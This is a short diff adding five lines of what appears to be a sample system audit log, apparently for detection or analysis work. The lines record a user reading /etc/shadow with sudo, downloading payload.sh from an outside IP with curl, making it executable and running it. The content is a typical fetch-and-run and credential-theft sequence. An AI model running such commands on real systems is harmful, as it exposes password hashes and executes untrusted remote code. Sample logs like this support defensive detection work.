@@ -1,0 +1,5 @@
+2026-10-20 09:15:18 USER=analyst EVENT=PROCESS_START COMMAND="/usr/bin/id"
+2026-10-20 09:15:42 USER=analyst EVENT=PRIVILEGE_USE COMMAND="sudo cat /etc/shadow"
+2026-10-20 09:16:03 USER=analyst EVENT=PROCESS_START COMMAND="curl -fsS http://198.51.100.88/payload.sh -o /tmp/update.sh"
+2026-10-20 09:16:15 USER=analyst EVENT=FILE_PERMISSION_CHANGE FILE="/tmp/update.sh" ACTION="chmod +x"
+2026-10-20 09:16:20 USER=analyst EVENT=PROCESS_START COMMAND="/tmp/update.sh"
